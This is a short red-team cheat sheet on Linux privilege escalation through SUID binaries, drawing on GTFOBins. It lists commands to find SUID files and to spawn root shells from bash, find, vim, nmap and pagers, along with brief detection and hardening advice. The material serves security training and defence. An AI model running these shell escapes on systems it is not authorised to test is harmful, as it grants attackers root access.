---
title: "SUID & GTFOBins"
category: "red-team"
tags: ["privesc", "linux", "suid", "gtfobins"]
platform: "linux"
mitre: ["T1548.001"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# SUID & GTFOBins

## TL;DR
A binary with the SUID bit runs with its owner's privileges (often root). If it lets you spawn a shell/command/read a file — you have privesc. [GTFOBins](https://gtfobins.github.io/) catalogs the abuses.

## Finding SUID
```bash
find / -perm -4000 -type f 2>/dev/null
# with details
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
```

## Common abuses (SUID → root shell)
```bash
# bash (SUID)      -> keep privileges with -p
bash -p
# find
find . -exec /bin/sh -p \; -quit
# vim
vim -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'
# nmap (old, interactive mode)
nmap --interactive   # then: !sh
# cp – overwrite /etc/passwd or copy a sensitive file
# less/more/man – from the pager: !/bin/sh
```

## Sudo vs SUID
- `sudo -l` → abuse via `sudo <binary>` (GTFOBins *Sudo* section).
- SUID bit → abuse without sudo (GTFOBins *SUID* section).

## Detection (Blue Team)
- New SUID files outside baseline (`chmod u+s`) — alert.
- auditd on `execve` of known GTFOBins run by service accounts.

## Mitigation / Hardening
- Remove SUID from binaries that don't legitimately need it: `chmod u-s /path`.
- SUID baseline (AIDE/tripwire), `nosuid` mounts wherever possible.

## Sources
- [GTFOBins](https://gtfobins.github.io/)
